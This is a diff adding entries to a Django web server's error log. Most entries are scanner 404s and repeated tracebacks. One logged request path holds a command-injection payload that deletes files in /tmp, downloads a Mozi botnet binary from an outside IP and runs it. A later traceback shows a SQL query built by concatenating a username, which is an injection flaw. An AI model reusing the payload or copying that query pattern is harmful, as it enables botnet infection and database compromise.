@@ -6140,3 +6140,93 @@ Traceback (most recent call last):
 ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
 2022-03-30 08:25:16,955 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
 2022-03-30 08:25:49,524 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-30 09:31:14,119 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-30 10:43:46,452 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-30 11:14:25,590 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-30 11:14:32,981 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /nice ports,/Trinity.txt.bak
+2022-03-30 11:14:37,150 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-30 11:14:38,607 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /sip:nm
+2022-03-30 12:04:10,483 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /*
+2022-03-30 12:39:43,688 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-30 14:15:42,252 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-30 15:52:16,461 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /language/Swedish${IFS}&&cd${IFS}/tmp;rm${IFS}-rf${IFS}*;wget${IFS}http://39.89.1.26:47079/Mozi.a;sh${IFS}/tmp/Mozi.a&>r&&tar${IFS}/string.js
+2022-03-30 15:53:42,924 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-30 18:33:35,954 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-30 19:00:09,177 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /login.cgi
+2022-03-30 21:44:14,325 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /*
+2022-03-30 23:55:04,133 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-30 23:55:07,017 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /system_api.php
+2022-03-30 23:55:07,550 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /c/version.js
+2022-03-30 23:55:08,084 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /streaming/clients_live.php
+2022-03-30 23:55:08,609 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /stalker_portal/c/version.js
+2022-03-30 23:55:09,138 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /stream/live.php
+2022-03-30 23:55:09,657 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /flu/403.html
+2022-03-31 00:23:27,269 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 188, in _get_response
+    self.check_response(response, callback)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 311, in check_response
+    "instead." % name
+ValueError: The view appa.views.login didn't return an HttpResponse object. It returned None instead.
+2022-03-31 00:23:28,368 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /robots.txt
+2022-03-31 00:31:01,004 [uWSGIWorker1Core0:140105604937920] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-31 00:45:41,351 [uWSGIWorker1Core0:139660277545152] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /user/
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+sqlite3.OperationalError: no such column: filestatus
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 190, in user
+    userdata['formnamelist'] = myform(request, usrname)
+  File "/root/liekiewaa/web/jobordera/appa/views.py", line 524, in myform
+    "select formfileid,formfilename,filestatus from appa_formfilelist where uploader='" + name + "'").fetchall()
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 82, in _execute
+    return self.cursor.execute(sql)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 421, in execute
+    return Database.Cursor.execute(self, query)
+django.db.utils.OperationalError: no such column: filestatus
